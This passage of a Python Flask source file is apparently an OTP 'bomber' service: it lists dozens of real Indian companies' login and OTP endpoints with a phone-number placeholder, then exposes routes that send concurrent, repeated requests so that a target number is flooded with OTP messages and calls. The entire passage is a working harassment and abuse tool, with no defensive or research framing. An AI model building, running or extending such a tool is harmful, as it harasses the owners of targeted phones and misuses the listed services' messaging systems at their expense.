        "headers": {"accept": "application/json", "content-type": "application/x-www-form-urlencoded"},
        "body": {"phonenumber": "+91{no}", "version": "2"},
        "type": "WHATSAPP"
    },
    {
        "name": "Unacademy",
        "url": "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json", "x-platform": "0"},
        "body": {"phone": "{no}", "country_code": "IN", "otp_type": 1, "send_otp": True},
        "type": "WHATSAPP"
    },
    {
        "name": "Myntra",
        "url": "https://www.myntra.com/gateway/v1/auth/getotp",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json", "x-myntraweb": "Yes"},
        "body": {"phoneNumber": "{no}", "signup": "ONECLICK"},
        "type": "WHATSAPP"
    },
    {
        "name": "Meesho",
        "url": "https://www.meesho.com/api/v1/user/login/request-otp",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "meesho-iso-country-code": "IN"},
        "body": {"phone_number": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Flipkart",
        "url": "https://2.rome.api.flipkart.com/api/7/user/otp/generate",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json"},
        "body": {"loginId": "+91{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "PW Store",
        "url": "https://api.penpencil.co/v1/users/get-otp",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "client": "hasura", "client_type": "WEB", "suborgid": "SUB-PWST002"},
        "body": {"username": "{no}", "countryCode": "+91", "organizationId": "5eb393ee95fab7468a79d189"},
        "type": "WHATSAPP"
    },
    {
        "name": "HDFC Ergo",
        "url": "https://here.co.in/users/v1/customer-portal/send-otp",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "x-api-client": "Website"},
        "body": {"mobile": "{no}", "source": "sms"},
        "type": "WHATSAPP"
    },
    {
        "name": "AstroTalk",
        "url": "https://api.prod.astrotalk.in/AstroTalk/v2/login/user/mobile-otp-login",
        "method": "POST",
        "headers": {"accept": "application/json"},
        "body": {"countryCode": "91", "isCall": "false", "appId": "4", "businessId": "1", "mobile": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "AstroYogi",
        "url": "https://chang.astroyogi.com/api/UserAccountV2/WebGenerateOtpV3",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"PhoneNumber": "{no}", "PhoneCode": "91", "Domain": "Web", "CountryId": "IN"},
        "type": "WHATSAPP"
    },
    {
        "name": "BigBasket",
        "url": "https://www.bigbasket.com/member-tdl/v3/member/otp",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "x-channel": "BB-WEB", "x-caller": "Monster-SVC"},
        "body": {"identifier": "{no}", "referrer": "unified_login"},
        "type": "WHATSAPP"
    },
    {
        "name": "Naaptol",
        "url": "https://www.naaptol.com/faces/jsp/ajax/ajax.jsp",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest"},
        "body": {"actionname": "checkMobileUserExistsForTvApp", "mobile": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "IndiaMart",
        "url": "https://m.indiamart.com/ajaxrequest/identified/common/login",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json"},
        "body": {"ph_code": "91", "use": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Ajio",
        "url": "https://login.web.ajio.com/api/auth/signupSendOTP",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"firstName": "User", "genderType": "Male", "login": "user@gmail.com", "mobileNumber": "{no}", "requestType": "SENDOTP"},
        "type": "WHATSAPP"
    },
    {
        "name": "Reliance Retail",
        "url": "https://api.account.relianceretail.com/service/application/retail-auth/v2.0/send-otp",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"mobile": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Snapdeal",
        "url": "https://www.snapdeal.com/isUserExists",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json", "x-requested-with": "XMLHttpRequest"},
        "body": {"userName": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "1mg",
        "url": "https://www.1mg.com/pwa-dweb-api/auth/create_token",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "x-access-key": "1mg_client_access_key", "x-platform": "desktop-0.0.1"},
        "body": {"phone": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Apollo Pharmacy",
        "url": "https://apigateway.apollo247.in/auth-service/generateOtp",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "x-app-os": "web"},
        "body": {"loginType": "PATIENT", "mobileNumber": "+91{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Blinkit",
        "url": "https://blinkit.com/v2/accounts/",
        "method": "POST",
        "headers": {"accept": "*/*", "app_client": "consumer_web", "content-type": "application/x-www-form-urlencoded", "platform": "mobile_web"},
        "body": {"user_phone": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "CityMall Web",
        "url": "https://citymall.live/web-api/auth/send-otp",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"phone_number": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Apna",
        "url": "https://production.apna.co/api/userprofile/v1/otp/",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"phone_number": "91{no}", "retries": 0, "hash_type": "employer", "source": "employer"},
        "type": "WHATSAPP"
    },
    {
        "name": "Aakash iACST",
        "url": "https://antheapi.aakash.ac.in/examapi/generate_register_otp?mobile={no}&exam_type=iACST",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json"},
        "body": {},
        "type": "WHATSAPP"
    },
    {
        "name": "Lenskart",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json", "x-api-client": "desktop"},
        "body": {"phoneCode": "+91", "telephone": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "IMO",
        "url": "https://dv02djmdl0r3o.cloudfront.net/json?uri=26350&aid=62",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"userId": "{no}", "country_code": "en-GB"},
        "type": "WHATSAPP"
    },
    {
        "name": "Shopsy",
        "url": "https://www.shopsy.in/1.rome/api/1/action/view",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "x-partner-context": '{"source":"reseller"}'},
        "body": {"actionRequestContext": {"loginIdPrefix": "+91", "loginId": "{no}"}},
        "type": "WHATSAPP"
    },
    {
        "name": "Smytten",
        "url": "https://route.smytten.com/",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "request_type": "web"},
        "body": {"guest_user_access": True, "value": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "OLX",
        "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json"},
        "body": {"grantType": "phone", "phone": "+91{no}", "language": "en-IN"},
        "type": "WHATSAPP"
    },
    {
        "name": "Upstox",
        "url": "https://service.upstox.com/login/open/v9/auth/1fa/otp/generate",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json"},
        "body": {"data": {"mobileNumber": "{no}"}},
        "type": "WHATSAPP"
    },
    {
        "name": "PolicyBazaar",
        "url": "https://myaccount.policybazaar.com/myacc/login/generateToken",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json", "x-client-source": "PBHOME_MYACC"},
        "body": {"source": "MYACC", "MobileNo": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "5Paisa",
        "url": "https://kycapi.5paisa.com/auth/otp/generate",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"loginType": "SMS", "mobileNo": "{no}", "appSource": "NEWWEB"},
        "type": "WHATSAPP"
    },
    {
        "name": "BookMyShow",
        "url": "https://in.bookmyshow.com/api/members/otp/send",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "x-app-code": "WEB"},
        "body": {"channel": "phone", "subChannel": "sms", "details": {"phone": "{no}", "isdCountryCode": "IN", "isdCode": "+91"}},
        "type": "WHATSAPP"
    },
    {
        "name": "MakeMyTrip",
        "url": "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP?region=in&currency=inr",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "user-country": "IN", "user-currency": "INR"},
        "body": {"countryCode": "91", "loginId": "{no}", "type": 6},
        "type": "WHATSAPP"
    },
    {
        "name": "Scaler",
        "url": "https://www.scaler.com/users/v2/",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "app-name": "desktop"},
        "body": {"type": "school_of_tech", "user": {"phone_number": "+91-{no}", "whatsapp_consent": "whatsapp_consent_yes"}},
        "type": "WHATSAPP"
    },
    {
        "name": "Navi",
        "url": "https://navi.com/pl/api/web/otp/v1/generate",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "x-platform": "WEB"},
        "body": {"deliveryType": "TEXT", "recipient": "{no}", "resend": False},
        "type": "WHATSAPP"
    },
    {
        "name": "KreditBee",
        "url": "https://api.kreditbee.in/v1/me/otp",
        "method": "PUT",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"mobile": "{no}", "reason": "loginOrRegister"},
        "type": "WHATSAPP"
    },
    {
        "name": "Housing",
        "url": "https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json", "app-name": "desktop_web_buyer"},
        "body": {"query": "mutation($phone: String) { sendOtp(phone: $phone) { success } }", "variables": {"phone": "{no}"}},
        "type": "WHATSAPP"
    },
    {
        "name": "99Acres",
        "url": "https://www.99acres.com/api-aggregator/auth/login/generate-otp?version2=true",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "platform": "desktop"},
        "body": {"countryCode": "91", "mobile": "91-{no}", "mode": "LOGIN_GENERATE", "platform": "desktop"},
        "type": "WHATSAPP"
    },
    {
        "name": "CarWale",
        "url": "https://www.carwale.com/api/user/login/otp-request/",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json"},
        "body": {"mobileNo": "{no}", "sourceModule": 14},
        "type": "WHATSAPP"
    },
    {
        "name": "Zepto",
        "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "app_sub_platform": "WEB", "platform": "WEB", "tenant": "ZEPTO"},
        "body": {"mobileNumber": "{no}", "countryCode": "+91"},
        "type": "WHATSAPP"
    },
    {
        "name": "Hyperpure",
        "url": "https://api.hyperpure.com/api/verifyUser?phoneNumber={no}",
        "method": "GET",
        "headers": {"accept": "application/json", "apptype": "mweb", "x-client": "consumer"},
        "body": {},
        "type": "WHATSAPP"
    },
    {
        "name": "Hotstar",
        "url": "https://www.hotstar.com/api/internal/bff/v2/pages/1/spaces/1/widgets/8?action=sendOtp",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json", "x-hs-platform": "web"},
        "body": {"body": {"@type": "type.googleapis.com/feature.login.InitiatePhoneLoginRequest", "phone_number": "{no}"}},
        "type": "WHATSAPP"
    },
    {
        "name": "PW Register 2",
        "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json", "randomid": "e66d7f5b-7963-408e-9892-839015a9c83f"},
        "body": {"mobile": "{no}", "countryCode": "+91", "subOrgId": "SUB-PWLI000"},
        "type": "WHATSAPP"
    },
    {
        "name": "Bisleri 2",
        "url": "https://apis.bisleri.com/send-otp",
        "method": "POST",
        "headers": {"Accept": "application/json", "Content-Type": "application/json", "x-requested-with": "7Yhm6b86qTsrpcMWtUixPLnv02nHf3wFf5vkukwu"},
        "body": {"email": "user1234@gmail.com", "mobile": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Licious 2",
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json", "serverside": "false"},
        "body": {"phone": "{no}", "captcha_token": None},
        "type": "WHATSAPP"
    },
    {
        "name": "GoPaySense 2",
        "url": "https://api.gopaysense.com/users/otp",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/json"},
        "body": {"phone": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Moglix 2",
        "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
        "method": "POST",
        "headers": {"accept": "application/json", "content-type": "application/json"},
        "body": {"email": "", "phone": "{no}", "type": "p", "source": "signup", "buildVersion": "DESKTOP-7.3", "device": "desktop"},
        "type": "WHATSAPP"
    },
    {
        "name": "UpGrad 2",
        "url": "https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone",
        "method": "POST",
        "headers": {"accept": "application/json", "client": "web", "content-type": "application/json"},
        "body": {"phoneNumber": "+91{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "PinkNBlu 2",
        "url": "http://www.pinknblu.com/v1/auth/generate/otp",
        "method": "POST",
        "headers": {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
        "body": {"_token": "HvvCsMqCY6poDB4GYPd2DJxewZ6H6TWPMHt8hfEV", "country_code": "+91", "phone": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Udaan 2",
        "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/x-www-form-urlencoded", "x-app-id": "udaan-auth"},
        "body": {"mobile": "{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Xylem 2",
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "headers": {"Accept": "application/json", "Authorization": "Bearer", "Content-Type": "application/json", "client-id": "64254d66be2a390018e6d348", "client-type": "WEB"},
        "body": {"mobile": "{no}", "countryCode": "+91", "firstName": "Anant Ambani"},
        "type": "WHATSAPP"
    },
    {
        "name": "NoBroker 2",
        "url": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
        "method": "POST",
        "headers": {"accept": "*/*", "content-type": "application/x-www-form-urlencoded"},
        "body": {"phone": "+91{no}"},
        "type": "WHATSAPP"
    },
    {
        "name": "Tyreplex 2",
        "url": "https://www.tyreplex.com/includes/ajax/gfend.php",
        "method": "POST",
        "headers": {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"},
        "body": {"perform_action": "sendOTP", "mobile_no": "{no}", "action_type": "order_login"},
        "type": "WHATSAPP"
    }
]

# ============================================================
# 💬 WHATSAPP SECTIONS 2, 3, 4 (Real APIs only, no placeholders)
# ============================================================

WHATSAPP_SECTION_2 = [
    # Twilio/Third-party placeholders REMOVED because they need real credentials
    # If you have real Twilio/UltraMsg/WATI/Gupshup/360Dialog credentials, add them here.
]

WHATSAPP_SECTION_3 = []

WHATSAPP_SECTION_4 = []

# ============================================================
# 🎰 GAMBLING APIS - Placeholder URLs REMOVED (they were fake)
# ============================================================

GAMBLING_APIS = []

# ============================================================
# 📦 COMBINE ALL WHATSAPP SECTIONS
# ============================================================

WHATSAPP_APIS = WHATSAPP_SECTION_1 + WHATSAPP_SECTION_2 + WHATSAPP_SECTION_3 + WHATSAPP_SECTION_4

# ============================================================
# 🛠️ HELPER: Recursively replace {no} in nested dicts/lists/strings
# ============================================================

def replace_placeholder(obj, phone):
    if isinstance(obj, dict):
        return {k: replace_placeholder(v, phone) for k, v in obj.items()}
    elif isinstance(obj, list):
        return [replace_placeholder(item, phone) for item in obj]
    elif isinstance(obj, str):
        return obj.replace("{no}", phone)
    else:
        return obj


def convert_form_body_to_string(body_dict):
    """Convert dict to URL-encoded form string"""
    parts = []
    for k, v in body_dict.items():
        parts.append(f"{k}={v}")
    return "&".join(parts)


# ============================================================
# 🛠️ PROCESS ENGINE (FIXED)
# ============================================================

def process_apis(apis, phone, count, api_type):
    """Process multiple APIs with true concurrency"""
    if not phone or len(phone) < 10:
        return jsonify({"error": "Invalid phone number. Must be at least 10 digits."}), 400

    if count < 1:
        count = 1
    if count > 50:
        count = 50  # safety cap

    if not apis:
        return jsonify({
            "phone": phone,
            "total_requests": 0,
            "success": 0,
            "failed": 0,
            "breakdown": {"sms": 0, "call": 0, "whatsapp": 0, "gambling": 0},
            "message": "No APIs configured in this section.",
            "results": []
        })

    results = []

    def send_request(api, phone):
        try:
            url = api.get('url', '').replace('{no}', phone)
            method = api.get('method', 'GET').upper()
            headers = api.get('headers', {})
            raw_body = api.get('body', {})
            raw_params = api.get('params', {})

            # Recursively replace {no}
            body = replace_placeholder(raw_body, phone) if raw_body else {}
            params = replace_placeholder(raw_params, phone) if raw_params else {}

            if method == 'GET':
                resp = requests.get(url, headers=headers, params=params, timeout=8)

            elif method == 'POST':
                content_type = str(headers.get('Content-Type', '')).lower()

                if 'application/json' in content_type:
                    resp = requests.post(url, headers=headers, json=body, params=params, timeout=8)
                elif 'x-www-form-urlencoded' in content_type or 'form-urlencoded' in content_type:
                    if isinstance(body, dict):
                        resp = requests.post(url, headers=headers, data=body, params=params, timeout=8)
                    else:
                        resp = requests.post(url, headers=headers, data=str(body), params=params, timeout=8)
                else:
                    # Default: try json
                    resp = requests.post(url, headers=headers, json=body, params=params, timeout=8)

            elif method == 'PUT':
                resp = requests.put(url, headers=headers, json=body, params=params, timeout=8)

            elif method == 'DELETE':
                resp = requests.delete(url, headers=headers, json=body, params=params, timeout=8)

            else:
                return {
                    "api": api.get('name'),
                    "type": api.get('type'),
                    "status": "unsupported_method",
                    "success": False
                }

            return {
                "api": api.get('name'),
                "type": api.get('type'),
                "status": resp.status_code,
                "success": 200 <= resp.status_code < 300
            }

        except requests.exceptions.Timeout:
            return {"api": api.get('name'), "type": api.get('type'), "status": "timeout", "success": False}
        except requests.exceptions.ConnectionError:
            return {"api": api.get('name'), "type": api.get('type'), "status": "connection_error", "success": False}
        except Exception as e:
            return {"api": api.get('name'), "type": api.get('type'), "status": "error", "message": str(e)[:120], "success": False}

    # Build task list: count * apis
    tasks = []
    for _ in range(count):
        for api in apis:
            tasks.append(api)

    # Run all tasks truly in parallel
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
        future_to_api = {executor.submit(send_request, api, phone): api for api in tasks}
        for future in concurrent.futures.as_completed(future_to_api):
            results.append(future.result())

    success = sum(1 for r in results if r.get('success'))

    sms_success = sum(1 for r in results if r.get('type') == 'SMS' and r.get('success'))
    call_success = sum(1 for r in results if r.get('type') == 'CALL' and r.get('success'))
    whatsapp_success = sum(1 for r in results if r.get('type') == 'WHATSAPP' and r.get('success'))
    gambling_success = sum(1 for r in results if r.get('type') == 'GAMBLING' and r.get('success'))

    return jsonify({
        "phone": phone,
        "api_type": api_type,
        "total_requests": len(results),
        "success": success,
        "failed": len(results) - success,
        "breakdown": {
            "sms": sms_success,
            "call": call_success,
            "whatsapp": whatsapp_success,
            "gambling": gambling_success
        },
        "results": results[:50]  # limit response size
    })


# ============================================================
# 🚀 MASTER ENDPOINTS
# ============================================================

@app.route('/api/sms/<phone>', methods=['GET'])
def send_sms(phone):
    count = request.args.get('count', 5, type=int)
    return process_apis(SMS_APIS, phone, count, "SMS")


@app.route('/api/call/<phone>', methods=['GET'])
def send_call(phone):
    count = request.args.get('count', 3, type=int)
    return process_apis(CALL_APIS, phone, count, "CALL")


@app.route('/api/whatsapp/<phone>', methods=['GET'])
def send_whatsapp(phone):
    count = request.args.get('count', 2, type=int)
    return process_apis(WHATSAPP_APIS, phone, count, "WHATSAPP")


@app.route('/api/whatsapp/section1/<phone>', methods=['GET'])
def send_whatsapp_section1(phone):
    count = request.args.get('count', 2, type=int)
    return process_apis(WHATSAPP_SECTION_1, phone, count, "WHATSAPP-S1")


@app.route('/api/whatsapp/section2/<phone>', methods=['GET'])
def send_whatsapp_section2(phone):
    count = request.args.get('count', 2, type=int)
    return process_apis(WHATSAPP_SECTION_2, phone, count, "WHATSAPP-S2")


@app.route('/api/whatsapp/section3/<phone>', methods=['GET'])
def send_whatsapp_section3(phone):
    count = request.args.get('count', 2, type=int)
    return process_apis(WHATSAPP_SECTION_3, phone, count, "WHATSAPP-S3")


@app.route('/api/whatsapp/section4/<phone>', methods=['GET'])
def send_whatsapp_section4(phone):
    count = request.args.get('count', 2, type=int)
    return process_apis(WHATSAPP_SECTION_4, phone, count, "WHATSAPP-S4")


@app.route('/api/gambling/<phone>', methods=['GET'])
def send_gambling(phone):
    count = request.args.get('count', 3, type=int)
    return process_apis(GAMBLING_APIS, phone, count, "GAMBLING")


@app.route('/api/all/<phone>', methods=['GET'])
def send_all(phone):
    count = request.args.get('count', 2, type=int)
    all_apis = SMS_APIS + CALL_APIS + WHATSAPP_APIS + GAMBLING_APIS
    return process_apis(all_apis, phone, count, "ALL")


@app.route('/api/master/<phone>', methods=['GET'])
def master_api(phone):
    count = request.args.get('count', 3, type=int)
    types = request.args.get('types', 'all').lower()

    if types == 'sms':
        apis, name = SMS_APIS, "SMS"
    elif types == 'call':
        apis, name = CALL_APIS, "CALL"
    elif types == 'whatsapp':
        apis, name = WHATSAPP_APIS, "WHATSAPP"
    elif types == 'whatsapp1':
        apis, name = WHATSAPP_SECTION_1, "WHATSAPP-S1"
    elif types == 'whatsapp2':
        apis, name = WHATSAPP_SECTION_2, "WHATSAPP-S2"
    elif types == 'whatsapp3':
        apis, name = WHATSAPP_SECTION_3, "WHATSAPP-S3"
    elif types == 'whatsapp4':
        apis, name = WHATSAPP_SECTION_4, "WHATSAPP-S4"
    elif types == 'gambling':
        apis, name = GAMBLING_APIS, "GAMBLING"
    else:
        apis, name = SMS_APIS + CALL_APIS + WHATSAPP_APIS + GAMBLING_APIS, "ALL"

    return process_apis(apis, phone, count, name)


@app.route('/api/health', methods=['GET'])
def health():
    return jsonify({
        "status": "active",
        "sms": len(SMS_APIS),
        "call": len(CALL_APIS),
        "whatsapp": len(WHATSAPP_APIS),
        "whatsapp_section1": len(WHATSAPP_SECTION_1),
        "whatsapp_section2": len(WHATSAPP_SECTION_2),
        "whatsapp_section3": len(WHATSAPP_SECTION_3),
        "whatsapp_section4": len(WHATSAPP_SECTION_4),
        "gambling": len(GAMBLING_APIS),
        "total": len(SMS_APIS) + len(CALL_APIS) + len(WHATSAPP_APIS) + len(GAMBLING_APIS),
        "message": "Master API is running!"
    })


@app.route('/api/stats', methods=['GET'])
def stats():
    return jsonify({
        "SMS_APIS": [api['name'] for api in SMS_APIS],
        "CALL_APIS": [api['name'] for api in CALL_APIS],
        "WHATSAPP_SECTION_1": [api['name'] for api in WHATSAPP_SECTION_1],
        "WHATSAPP_SECTION_2": [api['name'] for api in WHATSAPP_SECTION_2],
        "WHATSAPP_SECTION_3": [api['name'] for api in WHATSAPP_SECTION_3],
        "WHATSAPP_SECTION_4": [api['name'] for api in WHATSAPP_SECTION_4],
        "GAMBLING_APIS": [api['name'] for api in GAMBLING_APIS],
        "total_count": len(SMS_APIS) + len(CALL_APIS) + len(WHATSAPP_APIS) + len(GAMBLING_APIS)
    })


@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "name": "Master API",
        "version": "3.1",
        "endpoints": {
            "/api/sms/{phone}": "Send SMS (count optional)",
            "/api/call/{phone}": "Send CALL (count optional)",
            "/api/whatsapp/{phone}": "Send ALL WhatsApp (count optional)",
            "/api/whatsapp/section1/{phone}": "Send WhatsApp - Meta/Facebook",
            "/api/whatsapp/section2/{phone}": "Send WhatsApp - Twilio & SMS Gateways",
            "/api/whatsapp/section3/{phone}": "Send WhatsApp - Third Party Services",
            "/api/whatsapp/section4/{phone}": "Send WhatsApp - Gupshup & Others",
            "/api/gambling/{phone}": "Send Gambling (count optional)",
            "/api/all/{phone}": "Send ALL types (count optional)",
            "/api/master/{phone}": "Master API with type filter (e.g. ?types=sms&count=2)",
            "/api/health": "Health check",
            "/api/stats": "API statistics"
        },
        "example": "/api/whatsapp/9876543210?count=2"
    })


# ============================================================
# 🏁 RUN
# ============================================================
import os

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)